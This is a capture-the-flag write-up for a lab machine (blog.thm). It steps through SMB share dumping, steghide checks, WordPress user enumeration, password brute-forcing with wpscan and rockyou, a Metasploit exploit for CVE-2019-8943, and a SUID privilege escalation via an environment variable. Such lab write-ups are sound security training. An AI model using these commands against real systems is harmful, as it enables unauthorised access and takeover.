# recon

- set blog.thm into /etc/hosts

- nmap

![](https://hackmd.io/_uploads/BkWzQcogT.png)

# SMB
- 發現有開啟SMB，嘗試枚舉
    - `smbclient -L 10.10.14.208`

![](https://hackmd.io/_uploads/r115Ecoep.png)

- 發現有資料夾共享，叫做"BillySMB"
    - `smbclient //10.10.14.208/BillySMB`

- 進入後直接dump下來
    - `prompt off`
    - `mget *`

![](https://hackmd.io/_uploads/rk3BLcjga.png)

- 檢查圖片檔是否有用隱寫術
    - `steghide --info 檔名`

![](https://hackmd.io/_uploads/r1v1vcslT.png)

- 發現有但直接告訴你是兔子洞，還是把它提出來好了
    - `steghide extract -sf Alice-White-Rabbit.jpg`    

# web

- whatweb

![](https://hackmd.io/_uploads/SJUpD9oga.png)

![](https://hackmd.io/_uploads/H1A0P9sga.png)

- wordpress架構
    - `wpscan --url http://10.10.14.208 -e u ` --> 枚舉使用者帳號

![](https://hackmd.io/_uploads/S1E1F9sxp.png)

![](https://hackmd.io/_uploads/BkFGKcilT.png)

![](https://hackmd.io/_uploads/SkLVY9jgp.png)

- 使用wpscan進行爆破
        - wpscan --url http://10.10.14.208/ -U user.txt -P /usr/share/wordlists/rockyou.txt

![](https://hackmd.io/_uploads/BJD06cse6.png)

- 登入後進入wordpress後台

![](https://hackmd.io/_uploads/rkZWRcieT.png)

- 發現有上傳的功能

![](https://hackmd.io/_uploads/B17L1sil6.png)

- 嘗試塞reverse_shell 但都被擋了
- 想到之前wpscan掃出來是wordpress 5.0版，在exploit DB找相關的exploit，發現有CVE-2019-8943

- use msfconsole
    - set RHSOT、USERNAME、PASSWORD 
    - run
    - get meterpreter
        - shell
        - find -iname user.txt 
    ![](https://hackmd.io/_uploads/SJVLa02ga.png)
    
- 嘗試打開發現沒有辦法，只能提權了QQ 
    
# PrivESC

- `find / -perm -u=s -type f 2>/dev/null`

![](https://hackmd.io/_uploads/r1xSkJTgp.png)

- 發現有/usr/sbin/checker比較不尋常的，找GTFObins也沒有
    - ltrace /usr/sbin/checker

![](https://hackmd.io/_uploads/BktWe1pxp.png)

- `export admin=1`

![](https://hackmd.io/_uploads/H1xBeJTxp.png)









